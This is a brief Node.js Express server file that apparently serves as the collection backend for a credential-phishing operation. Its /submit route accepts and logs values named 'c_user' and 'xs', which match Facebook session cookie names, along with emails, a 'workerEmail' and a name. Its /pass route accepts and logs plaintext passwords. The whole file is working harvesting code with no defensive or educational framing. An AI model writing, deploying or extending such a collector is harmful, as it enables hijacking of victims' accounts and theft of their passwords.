const express = require('express');
const app = express();

app.use(express.json());

app.post('/submit', (req, res) => {
  const { c_user, xs, emails, workerEmail, name } = req.body;
  console.log("📥 Data from /submit:", { c_user, xs, emails, workerEmail, name });
  res.status(200).json({ success: true });
});

app.post('/pass', (req, res) => {
  const { password } = req.body;
  console.log("🔐 Password from /pass:", { password });
  res.status(200).json({ success: true });
});

app.get('/', (req, res) => {
  res.send('✅ Server is running. Use /submit or /pass to POST data.');
});

module.exports = app;
